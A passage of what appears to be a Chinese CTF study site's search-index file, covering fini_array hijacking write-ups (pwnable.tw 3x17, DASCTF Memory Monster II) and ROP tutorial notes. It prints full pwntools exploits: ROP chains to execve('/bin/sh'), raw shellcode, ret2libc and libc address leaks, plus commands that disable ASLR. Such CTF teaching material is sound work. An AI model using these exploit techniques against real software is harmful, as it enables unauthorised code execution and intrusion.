\u5199\u5165\u5b8c\u6210\u540e\uff0c\u5c06 fini_array[0] \u8986\u76d6\u4e3a leave|ret \uff0c\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10; \u6784\u5efa\u7684\u7cfb\u7edf\u8c03\u7528\u547d\u4ee4\uff1asyscall(0x3b,addr_of_binsh,0,0) \u76f8\u5f53\u4e8e\uff1aexecve(addr_of_binsh,0,0) \u7cfb\u7edf\u8c03\u7528\u53f7\u67e5\u8be2\uff1a https://www.mrskye.cn/archives/168/","title":"\u601d\u8def"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#exp","text":"from pwn import * context . log_level = 'debug' #p = process(\"./317\") p = remote ( \"chall.pwnable.tw\" , 10105 ) elf = process ( \"./317\" ) fini_array = 0x4B40F0 main_addr = 0x401B6D libc_csu_fini = 0x402960 esp = fini_array + 0x10 leave_ret = 0x401C4B ret = 0x401016 rop_syscall = 0x471db5 rop_pop_rax = 0x41e4af rop_pop_rdx = 0x446e35 rop_pop_rsi = 0x406c30 rop_pop_rdi = 0x401696 bin_sh_addr = 0x4B419A def write ( addr , data ): p . recv () p . send ( str ( addr )) p . recv () p . send ( data ) def exp (): # hijack fini_array #gdb.attach(p) write ( fini_array , p64 ( libc_csu_fini ) + p64 ( main_addr )) # rop chain write ( bin_sh_addr , \"/bin/sh \\x00 \" ) write ( esp , p64 ( rop_pop_rax )) write ( esp + 8 , p64 ( 0x3b )) write ( esp + 16 , p64 ( rop_pop_rdi )) write ( esp + 24 , p64 ( bin_sh_addr )) write ( esp + 32 , p64 ( rop_pop_rdx )) write ( esp + 40 , p64 ( 0 )) write ( esp + 48 , p64 ( rop_pop_rsi )) write ( esp + 56 , p64 ( 0 )) write ( esp + 64 , p64 ( rop_syscall )) # stack pivoting write ( fini_array , p64 ( leave_ret ) + p64 ( ret )) if __name__ == '__main__' : exp () p . interactive ()","title":"exp"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_5","text":"[\u539f\u521b]pwnable.tw\u65b0\u624b\u5411write up(\u4e8c) 3\u00d717-x64\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#memory-monster-ii","text":"\u9898\u76ee\u6765\u6e90 DASCTF \u4e94\u6708\u8d5b\uff0c\u4f5c\u8005\u4e3a TaQini \uff0c \u9644\u4ef6 \u8fd9\u91cc\u548c\u4e0a\u9762\u90a3\u6761\u673a\u4f1a\u4e00\u6837\uff0c\u4e0b\u9762\u662f\u72ec\u7acb\u5b8c\u6210\uff0c\u8be6\u7ec6\u8bb0\u5f55\u4e00\u4e0b","title":"Memory Monster II"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_6","text":"checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5**\u662f\u6709 canary \u4fdd\u62a4**\u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 )","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_7","text":"\u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6ca1\u6709\u5375\u7528\u53ea\u4fee\u590d\u4e86\u4e24\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u80fd\u770b\u5230 _start \u51fd\u6570\uff1a\uff08\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\uff09 . text : 0000000000401 B00 public start . text : 0000000000401 B00 start proc near ; DATA XREF : LOAD : 000000000040001 8 \u2191 o . text : 0000000000401 B00 ; __unwind { . text : 0000000000401 B00 xor ebp , ebp . text : 0000000000401 B02 mov r9 , rdx . text : 0000000000401 B05 pop rsi . text : 0000000000401 B06 mov rdx , rsp . text : 0000000000401 B09 and rsp , 0F FFFFFFFFFFFFFF0h . text : 0000000000401 B0D push rax . text : 0000000000401 B0E push rsp . text : 0000000000401 B0F mov r8 , offset __libc_start_fini . text : 0000000000401 B16 mov rcx , offset __libc_start_init . text : 0000000000401 B1D mov rdi , offset main . text : 0000000000401 B24 db 67 h . text : 0000000000401 B24 call sub_4020B0 . text : 0000000000401 B2A hlt . text : 0000000000401 B2A ; } // starts at 401B00 . text : 0000000000401 B2A start endp \u4f9d\u636e\u89c4\u5f8b\u77e5\u9053\u4e09\u4e2a mov \u4f9d\u6b21\u662f\u5904\u7406 __libc_start_fini\u3001__libc_start_init\u3001main \u3002\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u5173\u952e\u53c2\u6570\uff1a __libc_start_fini\u3001main \u5730\u5740\u3002 \u7136\u540e gdb \u8c03\u8bd5\uff0c\u65ad\u70b9\u6253\u5728 __libc_start_fini \uff0c\u4e00\u76f4\u8fd0\u884c\u5230 call \u6307\u4ee4\uff0crbp \u5b58\u50a8\u7684\u503c\u5c31\u662f fini_array[0] \u7684\u5730\u5740 0x4b80b0 \uff1a leave_ret \u548c ret \u901a\u8fc7 ROPgadget \u76f4\u63a5\u80fd\u67e5\u5230\uff1brax\u3001rdi\u3001rsi\u3001rdx \u4f20\u53c2 gadget \u4e5f\u80fd\u627e\u5230\uff0c\u8fd9\u51e0\u4e2a gadget \u627e\u90a3\u79cd\u53ea\u7a7f\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\uff1a pop rax;ret \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#exp_1","text":"from pwn import * context . log_level = 'debug' p = process ( \"./main\" ) elf = ELF ( \"./main\" ) #hijack fini libc_csu_fini = 0x0402CB0 main_addr = 0x0401C1D fini_array = 0x4b80b0 esp = fini_array + 0x10 leave_ret = 0x0401cf3 ret = 0x0401016 #execve('/bin/sh',0,0) rop_syscall = 0x46F745 rop_pop_rax = 0x0000000000448fcc rop_pop_rdx = 0x0000000000448415 rop_pop_rsi = 0x0000000000406f80 rop_pop_rdi = 0x0000000000401746 bin_sh_addr = 0x492895 def write ( addr , data ): p . sendlineafter ( 'addr:' , p64 ( addr )) p . sendafter ( 'data:' , data ) # hijack fini_array gdb . attach ( p , 'b *0x0402CB0' ) write ( fini_array , p64 ( libc_csu_fini ) + p64 ( main_addr )) # rop chain write ( esp , p64 ( rop_pop_rax )) write ( esp + 8 , p64 ( 0x3b )) write ( esp + 16 , p64 ( rop_pop_rdi )) write ( esp + 24 , p64 ( bin_sh_addr )) write ( esp + 32 , p64 ( rop_pop_rdx )) write ( esp + 40 , p64 ( 0 )) write ( esp + 48 , p64 ( rop_pop_rsi )) write ( esp + 56 , p64 ( 0 )) write ( esp + 64 , p64 ( rop_syscall )) # stack pivoting #gdb.attach(p) write ( fini_array , p64 ( leave_ret ) + p64 ( ret )) p . interactive ()","title":"exp"},{"location":"Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_8","text":"\u8be6\u89e364\u4f4d\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301\u53caROP\u653b\u51fb","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","text":"\u8bfe\u672c\u5730\u5740\uff1a https://segmentfault.com/a/1190000005888964 \u7b14\u8bb0\u4e2d\u6240\u7528\u5230\u7684\u7a0b\u5e8f&\u811a\u672c\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/zhengmin1989/ROP_STEP_BY_STEP(\u539f\u4f5c\u8005github\u4ed3\u5e93 ) \u672c\u6587\u9996\u53d1\u4e8e\uff1a https://www.mrskye.cn \u4e00\u6b65\u4e00\u6b65\u5b66ROP\u4e4bLinux\u7bc7 - \u5b66\u4e60\u7b14\u8bb0 \u00b6 \u57fa\u7840\u4ecb\u7ecd \u00b6 ROP \u7684\u5168\u79f0\u4e3a Return-oriented programming \uff08\u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff09\u3002\u662f\u4e00\u79cd\u9ad8\u7ea7\u7684\u5185\u5b58\u653b\u51fb\u6280\u672f\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u7684\u5404\u79cd\u901a\u7528\u9632\u5fa1\uff08\u6bd4\u5982\u5185\u5b58\u4e0d\u53ef\u6267\u884c\u548c\u4ee3\u7801\u7b7e\u540d\u7b49\uff09 x86\u7bc7 \u00b6 level 1 - \u6808\u4e0a\u6267\u884cshellcode \u00b6 \u5e38\u89c1\u7684\u7a0b\u5e8f\u6d41\u52ab\u6301\u5c31\u662f\u6808\u6ea2\u51fa\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\u548c\u5806\u6ea2\u51fa\u3002\u6700\u5e38\u89c1\u7684\u9632\u5fa1\u65b9\u6cd5\u6709DEP\uff08\u5806\u6808\u4e0d\u53ef\u6267\u884c\uff09\uff0cASLR\uff08\u5185\u5b58\u5730\u5740\u968f\u673a\u5316\uff09\uff0cStack Protector\uff08\u6808\u4fdd\u62a4\uff09\u7b49\u3002\u4e0b\u9762\u770b\u770b\u8fd9\u9898\uff0c\u7a0b\u5e8f\u6d41\u52ab\u6301\u3002 \u521d\u5b66\u9636\u6bb5\uff0c\u5148\u5173\u95edLinux\u7cfb\u7edf\u7684ASLR\u4fdd\u62a4\uff1a sudo -S echo 0 > /proc/sys/kernel/randomize_va_space exit \u4e0b\u8f7d level1 \u9898\u76ee\uff0c\u653e\u5165\u5230IDA\u5206\u6790\uff0c\u5728 vulnerable_function() \u4e2d\u5b58\u5728\u7740\u6808\u6ea2\u51fa\uff080x100>88\uff09 \u8fd0\u884c\u7a0b\u5e8f\uff0c\u8f93\u5165\u4e00\u4e32\u5b57\u7b26\u4e32\u7136\u540e\u8fd4\u56dehelloworld\uff1bfile\u67e5\u770b\u662f\u4e2a\u52a8\u6001\u94fe\u63a5\u768432\u4f4d\u6587\u4ef6\uff1bchecksec\u67e5\u770b\u6240\u6709\u5b89\u5168\u7f16\u8bd1\u9009\u9879\u90fd\u6ca1\u6709\u5f00 \u7136\u540e\u5c31\u662f\u786e\u8ba4\u6ea2\u51fa\u70b9\uff08\u6808\u7684eip\uff09\u7684\u4f4d\u7f6e\uff0c\u4f7f\u7528\u4f5c\u8005\u63d0\u4f9b\u7684 pattern.py \u811a\u672c\u8fdb\u884c\u8ba1\u7b97\u3002\u521b\u5efa200\u5b57\u8282\u7684\u6d4b\u8bd5\u5b57\u7b26\u4e32 \u7136\u540e gdb ./level1 \u8c03\u8bd5\u7a0b\u5e8f\uff0c r \u8fd0\u884c\u7a0b\u5e8f\u540e\u8f93\u5165\u6d4b\u8bd5\u5b57\u7b26\u4e32\uff0c\u5f97\u5230\u5185\u5b58\u51fa\u9519\u5730\u5740\uff1a \u67e5\u8be2\u504f\u79fb\u91cf\uff0c\u8fd9\u91cc\u7684\u504f\u79fb\u91cf\u662f\u6307\u4ece\u53d8\u91cf\u5199\u5165\u5904\u5230eip\u9876\u5185\u5b58\u957f\u5ea6\u3002 \u5f53\u7136\uff0c\u53ef\u4ee5\u81ea\u5df1\u624b\u52a8\u8ba1\u7b97\u3002\u504f\u79fb\u91cf=0x88+0x4=140\u30020x4\u4e3aebp\uff0c0x88\u4e3a\u53d8\u91cf\u7a7a\u95f4\u3002 \u53ea\u8981\u6784\u9020\u4e00\u4e2a [shellcode][\u201cAAAAAAAAAAAAAA\u201d\u2026.][ret] \u5b57\u7b26\u4e32\uff0c\u5c31\u53ef\u4ee5\u8ba9pc\u6267\u884cret\u5730\u5740\u4e0a\u7684\u4ee3\u7801\u4e86\u3002\u4e5f\u5c31\u662f\u9700\u8981\u77e5\u9053shellcode\u6240\u5728\u7684\u5185\u5b58\u5730\u5740 \u8fd9\u91cc\u6ce8\u610f\u7684\u662f\u7528gdb\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u7136\u540e\u67e5\u5185\u5b58\u6765\u786e\u5b9a\u7684shellcode\u6240\u5728\u4f4d\u7f6e\uff0c\u662f\u9519\u8bef\u7684\u3002\u56e0\u4e3agdb\u4f1a\u5f71\u54cdbuf\u7684\u5185\u5b58\u4f4d\u7f6e\uff0c\u5373\u4f7f\u662f\u5173\u95edALSR\u3002\u89e3\u51b3\u529e\u6cd5\u4e4b\u4e00\u5c31\u662f\u5f00\u542f core dump ulimit -c unlimited sudo sh -c 'echo \"/tmp/core.%t\" > /proc/sys/kernel/core_pattern' \u5f00\u542f\u4e4b\u540e\uff0c\u518d\u6b21\u8f93\u5165\u6d4b\u8bd5\u5b57\u7b26\u4e32\uff08\u6216\u957f\u5ea6\u5927\u4e8e144\u7684\u5b57\u7b26\u4e32\uff09\uff0c\u56e0\u6b64\u7a0b\u5e8f\u5185\u5b58\u9519\u8bef\uff0c\u4f7f\u7cfb\u7edf\u5728 /tmp \u751f\u6210\u4e00\u4e2a core dump \u6587\u4ef6\u3002\u7528gdb\u67e5\u770b\u8fd9\u4e2acore\u6587\u4ef6\u5f97\u5230\u771f\u6b63\u7684buf\u5730\u5740\uff08\u672c\u673a\u662f0xffffcec0\uff0c\u6bcf\u53f0\u673a\u4e0d\u4e00\u6837\uff0c\u8bf7\u5b9e\u9645\u64cd\u4f5c\u4e00\u4e0b\uff09\u3002 \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 #encoding:utf-8 from pwn import * context . log_level = 'debug' p = process ( \"./level1\" ) ret_address = 0xffffcec0 # \u8bf7\u4fee\u6539\u4e3a\u4f60\u83b7\u53d6\u7684shellcode\u6240\u5728\u7684\u5185\u5b58\u5730\u5740 # shellcode \u53ef\u4ee5\u7528msf\u751f\u6210\uff0c\u6216\u8005\u53bbgithub\u627e\u4e00\u4e2a\uff0c\u6ce8\u610f\u957f\u5ea6! shellcode = \" \\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73 \" shellcode += \" \\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0 \" shellcode += \" \\x0b\\xcd\\x80 \" payload = shellcode + 'a' * ( 0x88 + 0x4 - len ( shellcode )) + p32 ( ret_address ) p . send ( payload ) p . interactive () # \u91ca\u653e\u63a7\u5236\u6743 \u6709\u53ef\u80fd\u811a\u672c\u8fd8\u662f\u4e0d\u80fd\u6210\u529fgetshell\uff0c\u5f88\u5927\u6982\u7387\u662fret\u7684\u5730\u5740\u9519\u4e86\u3002\u6211\u4eec\u518d\u4e00\u6b21\u67e5\u627e\u5730\u5740\uff0c\u8fd9\u6b21\u52a0\u8f7d\u7684\u6700\u65b0\u7684core\u6587\u4ef6\uff08\u540e\u7f00\u5927\u7684\uff09\u3002 \u66ff\u6362\u4e3a\u8be5\u5730\u5740\uff0c\u5373\u53ef\u3002 \u9664\u4e86\u672c\u5730\u8c03\u8bd5\uff0c\u8fd8\u6709\u8fdc\u7a0b\u90e8\u7f72\u7684\u65b9\u5f0f\uff0c\u5982\u4e0b\uff0c\u5c06\u9898\u76ee\u7ed1\u5b9a\u5230\u6307\u5b9a\u7aef\u53e3\u4e0a\uff1a socat tcp-l:10001,fork exec:./level1 payload\u9664\u4e86\u5c06p = process(\u201c./level1\u201d)\u6539\u4e3ap = remote(\u201c127.0.0.1\u201d, 10001)\u5916\uff0cret\u7684\u5730\u5740\u8fd8\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u89e3\u51b3\u65b9\u6cd5\u8fd8\u662f\u91c7\u7528\u751f\u6210core dump\u7684\u65b9\u6848\uff0c\u7136\u540e\u7528gdb\u8c03\u8bd5core\u6587\u4ef6\u83b7\u53d6\u8fd4\u56de\u5730\u5740\uff0c\u5373\u53ef\u8fdc\u7a0bgetshell\u3002 level 2 - ret2libc \u7ed5\u8fc7 DEP \u9632\u62a4 \u00b6 \u4f7f\u7528 checksec \u68c0\u67e5\u9898\u76ee level2 \uff0c\u53d1\u73b0\u6253\u5f00\u4e86NX\u4fdd\u62a4\uff08\u6808\u4e0d\u53ef\u6267\u884c\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u80fd\u50cf\u4e0a\u4e00\u9898\u5c06shellcode\u5199\u5230\u6808\u4e0a\u540e\u6267\u884c\u3002 \u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u4f1a\u8c03\u7528\u51fd\u6570\u5e93 libc.so \uff0c\u800cshellcode\u7684\u6267\u884c\u6548\u679c\u7b49\u4e8e system(\"/bin/sh\") \uff0c\u95ee\u9898\u5c31\u662f\u5982\u4f55\u83b7\u5f97system\u548c\"/bin/sh\"\u7684\u5730\u5740\u3002 \u6211\u4eec\u5173\u95ed\u4e86\u7cfb\u7edf\u7684ASLR\uff0c\u51fd\u6570\u5728\u5185\u5b58\u7684\u5730\u5740\u4e0d\u4f1a\u53d8\u6362\uff0c\u5b57\u7b26\u4e32\u4e5f\u662f\u56fa\u5b9a\u7684\u3002\u8fd9\u65f6\u53ef\u4ee5\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\uff0c\u901a\u8fc7 print \u548c find \u547d\u4ee4\u67e5\u627e\u3002 gdb\u6253\u5f00\u540e\uff0c\u9996\u5148\u5728main\u51fd\u6570\u4e0a\u6253\u4e0b\u65ad\u70b9\uff0c\u7136\u540e\u8fd0\u884c\u7a0b\u5e8f\uff0c\u8ba9libc.so\u51fd\u6570\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u4f7f\u7528 print system \u83b7\u53d6system\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\uff1b\u4f7f\u7528 print __libc_start_main \u83b7\u53d6libc.so\u8d77\u59cb\u5730\u5740\u3002\u4f7f\u7528 find [\u8d77\u59cb\u5730\u5740],[+\u641c\u7d22\u957f\u5ea6],[\u5b57\u7b26\u4e32] \u83b7\u53d6\"/bin/sh\"\u5185\u5b58\u5730\u5740\u3002 $ gdb level2 '' ' gef\u27a4 b main Breakpoint 1 at 0x8048430 gef\u27a4 r Starting program: /home/skye/rop/level2/level2 Breakpoint 1 , 0x08048430 in main () gef\u27a4 print system $1 = { int ( const char * )} 0xf7e19200 <__libc_system> gef\u27a4 print __libc_start_main $2 = { int ( int ( * )( int, char **, char ** ) , int, char **, int ( * )( int, char **, char ** ) , void ( * )( void ) , void ( * )( void ) , void * )} 0xf7df4d90 <__libc_start_main> gef\u27a4 find 0xf7df4d90,+2200000, \"/bin/sh\" 0xf7f5a0cf warning: Unable to access 16000 bytes of target memory at 0xf7fb7cd7, halting search. 1 pattern found. \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 #coding:utf-8 from pwn import * context . log_level = 'debug' p = process ( \"./level2\" ) system_addr = 0xf7e19200 binsh_addr = 0xf7f5a0cf ret = 0xdeadbeef payload = 'a' * 140 + p32 ( system_addr ) + p32 ( ret ) + p32 ( binsh_addr ) p . send ( payload ) p . interactive () level 2 - \u901a\u8fc7 ROP \u7ed5\u8fc7 DEP \u548c ASLR \u9632\u62a4 \u00b6 \u6253\u5f00ALSR\u4fdd\u62a4\uff1a sudo -s echo 2 > /proc/sys/kernel/randomize_va_space \u5f00ALSR\u4e4b\u540e\uff0c\u6211\u4eec\u6bcf\u6b21\u4ecegdb\u4e2d\u67e5\u627e\u7684\u5730\u5740\u90fd\u662f\u53d8\u5316\u7684\u3002\u4f46\u662f\u7a0b\u5e8f\u672c\u8eab\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u5e76\u4e0d\u662f\u968f\u673a\u7684\u3002\u5982\u56fe\u6240\u793a\uff1a \u601d\u8def\u662f\uff1a\u6211\u4eec\u6cc4\u9732\u51falibc.so\u67d0\u4e9b\u51fd\u6570\u5728\u5185\u5b58\u4e2d\u5730\u5740\uff0c\u7136\u540e\u5229\u7528\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\u5730\u5740\u6839\u636e\u51fd\u6570\u7684\u504f\u79fb\u91cf\u8ba1\u7b97\u5f97\u51fasystem()\u548c\"/bin/sh\"\u7684\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u6267\u884csystem(\"/bin/sh\") \u7531\u4e8e\u9898\u76ee\u6ca1\u6709\u7ed9\u51falibc.so\uff0c\u4f7f\u7528 ldd \u547d\u4ee4\u67e5\u8be2\u7a0b\u5e8f\u8c03\u7528\u7684\u51fd\u6570\u5e93\uff0c\u7136\u540e\u5c06\u51fd\u6570\u5e93\u6587\u4ef6\u62f7\u8d1d\u5f53\u524d\u76ee\u5f55 $ ldd level2 linux-gate.so.1 ( 0xf7fd4000 ) libc.so.6 = > /lib/i386-linux-gnu/libc.so.6 ( 0xf7ddc000 ) /lib/ld-linux.so.2 ( 0xf7fd6000 ) $ sudo cp /lib/i386-linux-gnu/libc.so.6 libc.so \u5229\u7528objdump\u67e5\u770b\u7a0b\u5e8f\u7684plt\u548cgot\u8868\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u80fd\u5148\u5229\u7528\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u51fd\u6570\uff0c\u53bb\u6cc4\u9732\u5bf9\u5e94\u7684\u5730\u5740\u3002\uff08\u56fe\u4e00.plt\u8868\uff0c\u56fe\u4e8c.got\u8868\uff09 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 write@plt() \u51fd\u6570\u628a\u5b58\u50a8\u5728 write@GLIBC_2.0 (\u6216\u79f0 write.got )\u7684 write() \u51fd\u6570\u7684\u5185\u5b58\u5730\u5740\u6253\u5370\u51fa\u6765\u3002\u7136\u540e\u8ba1\u7b97system()\u548c\"/bin/sh\"\u4e0ewrite()\u5728\u51fd\u6570\u5e93libc.so\u4e2d\u7684offset\uff08\u76f8\u5bf9\u5730\u5740\uff09\u5f97\u5230\u6700\u540e\u7684\u5730\u5740\u3002 Q: \u4e3a\u4ec0\u4e48\u7528\u7684\u662f\u8c03\u7528write@plt()\u6253\u5370write@got()\uff1f A: write() \u51fd\u6570\u5b9e\u73b0\u662f\u5728 libc.so \u5f53\u4e2d\uff0c\u90a3\u6211\u4eec\u8c03\u7528\u7684 write@plt() \u51fd\u6570\u4e3a\u4ec0\u4e48\u4e5f\u80fd\u5b9e\u73b0 write() \u529f\u80fd\u5462? \u8fd9\u662f\u56e0\u4e3alinux\u91c7\u7528\u4e86\u5ef6\u65f6\u7ed1\u5b9a\u6280\u672f\uff0c\u5f53\u6211\u4eec\u8c03\u7528 write@plit() \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u4f1a\u5c06\u771f\u6b63\u7684 write() \u51fd\u6570\u5730\u5740link\u5230got\u8868\u7684 write.got \u4e2d\uff0c\u7136\u540e write@plit() \u4f1a\u6839\u636e write.got \u8df3\u8f6c\u5230\u771f\u6b63\u7684 write() \u51fd\u6570\u4e0a\u53bb\u3002\uff08\u5982\u679c\u8fd8\u662f\u641e\u4e0d\u6e05\u695a\u7684\u8bdd\uff0c\u63a8\u8350\u9605\u8bfb\u300a\u7a0b\u5e8f\u5458\u7684\u81ea\u6211\u4fee\u517b - \u94fe\u63a5\u3001\u88c5\u8f7d\u4e0e\u5e93\u300b\u8fd9\u672c\u4e66\uff09 \u518d\u5c06pc\u6307\u9488return\u56de vulnerable_function() \u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884cret2libc\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u4e14\u8fd9\u4e00\u6b21\u6211\u4eec\u77e5\u9053\u4e86 system() \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 system() \u51fd\u6570\u6765\u83b7\u53d6\u6211\u4eec\u7684shell\u4e86\u3002 \u672c\u5730EXP \u51fd\u6570\u3001gadget\u7b49\u5730\u5740\uff0c\u53ef\u80fd\u56e0\u7535\u8111\u4e0d\u540c\u800c\u4e0d\u4e00\u81f4\u3002\u8bf7\u52a8\u624b\u64cd\u4f5c\uff0c\u83b7\u53d6\u672c\u673a\u76f8\u5173\u5730\u5740\u540e\uff0c\u81ea\u884c\u66ff\u6362 # coding:utf-8 from pwn import * context . log_level = 'debug' elf = ELF ( \"./level2\" ) libc = ELF ( \"./libc.so\" ) p = process ( \"./level2\" ) write_plt = elf . symbols [ 'write' ] # \u83b7\u53d6\u7a0b\u5e8f\u4e2d\u7684write.plt write_got = elf . got [ 'write' ] # \u83b7\u53d6\u7a0b\u5e8f\u4e2d\u7684write.got vulfun_addr = 0x08048404 # \u6f0f\u6d1e\u51fd\u6570\u5730\u5740 payload_1 = 'a' * 140 + p32 ( write_plt ) + p32 ( vulfun_addr ) + p32 ( 1 ) + p32 ( write_got ) + p32 ( 4 ) p . send ( payload_1 ) write_addr = u32 ( p . recv ( 4 )) # \u63a5\u53d7\u8fd4\u56de\u7684\u5185\u5b58\u5730\u5740 libc_addr = write_addr - libc . symbols [ 'write' ] system_addr = libc_addr + libc . symbols [ 'system' ] binsh_addr = libc_addr + next ( libc . search ( '/bin/sh' )) # \u5bfb\u627e\u5b57\u7b26\u4e32\u5730\u5740 payload_2 = 'a' * 140 + p32 ( system_addr ) + p32 ( vulfun_addr ) + p32 ( binsh_addr ) p . send ( payload_2 ) p . interactive () level 2 - \u5728\u4e0d\u83b7\u53d6\u76ee\u6807libc.so\u7684\u60c5\u51b5\u4e0b\u8fdb\u884cROP\u653b\u51fb \u00b6 \u5982\u679c\u4e0d\u80fd\u83b7\u53d6\u76ee\u6807\u673a\u5668\u4e0a\u7684libc.so\u6216\u8005\u5177\u4f53\u7684linux\u7248\u672c\u53f7\uff0c\u5e94\u8be5\u600e\u4e48\u8ba1\u7b97\u5f97\u51fa\u504f\u79fb\u5730\u5740\uff08offset\uff09\uff1f \u5229\u7528DynELF\u6a21\u5757\u901a\u8fc7\u5185\u5b58\u6cc4\u9732(memory leak)\u6765\u641c\u7d22\u5185\u5b58\u4e2d\u7684system()\u5730\u5740\u3002\u9700\u8981\u7684\u662f\u4e00\u4e2a lead(address) \u51fd\u6570\u3002\u7531\u4e8eDynELF\u6a21\u5757\u53ea\u80fd\u53d6\u5f97system()\u5730\u5740\uff0c\u6240\u4ee5\u9700\u8981\u8c03\u7528read()\u6216\u5176\u4ed6\u51fd\u6570\uff0c\u5c06 /bin/sh \u5199\u5165\u5230\u7a0b\u5e8f\u7684\u975e\u968f\u673a\u6bb5\uff08\u5982.bss\u6bb5\uff09\u3002\u901a\u8fc7 readelf -S level2 \u6216\u8005\u5728IDA\u4e2d\u5feb\u6377\u952e ctrl+s \u83b7\u53d6\u5230bss\u6bb5\u7684\u5730\u5740\u3002 \u56e0\u4e3a\u6211\u4eec\u5728\u6267\u884c\u5b8cread()\u4e4b\u540e\u8981\u63a5\u7740\u8c03\u7528system(\u201c/bin/sh\u201d)\uff0c\u5e76\u4e14read()\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u6709\u4e09\u4e2a\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2apop pop pop ret\u7684gadget\u7528\u6765\u4fdd\u8bc1\u6808\u5e73\u8861\u3002\u5229\u7528\u7684\u662fROPgadget\u5de5\u5177\u5feb\u901f\u67e5\u627e\u53ef\u7528gadget\uff0c ROPgadget --binary level2 --only \"pop|ret\" \u653b\u51fb\u601d\u8def\uff1a\u9996\u5148\u901a\u8fc7DynELF\u83b7\u53d6\u5230system()\u5730\u5740\uff0c\u901a\u8fc7read()\u5c06\u201c/bin/sh\u201d\u5199\u5165\u5230.bss\u6bb5\uff0c\u901a\u8fc7gadget\u6e05\u7a7aread()\u6808\u4e0a\u53c2\u6570\u540e\uff0c\u8c03\u7528system(\"/bin/sh\")\u3002 \u672c\u5730EXP 